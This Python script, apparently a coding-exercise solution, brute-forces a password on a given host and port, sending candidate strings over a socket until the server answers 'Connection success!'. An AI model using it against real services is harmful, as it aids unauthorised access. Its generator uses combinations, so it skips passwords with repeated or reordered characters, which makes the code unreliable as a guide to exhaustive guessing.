import argparse
import socket
import string
import itertools


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", type=str)
    parser.add_argument('port', type=int)
    return parser.parse_args()


def generate_passwords():
    password_symbols = list(string.ascii_lowercase + string.digits)
    for length in range(1, len(password_symbols)):
        for possible_password in itertools.combinations(password_symbols, length):
            yield "".join(possible_password)


def main():
    args = parse_args()
    buffer_size = 1024
    with socket.socket() as client:
        address = (args.hostname, args.port)
        client.connect(address)
        for possible_password in generate_passwords():
            client.send(possible_password.encode())
            response = client.recv(buffer_size)
            if response.decode() == 'Connection success!':
                print(possible_password)
                break


if __name__ == '__main__':
    main()

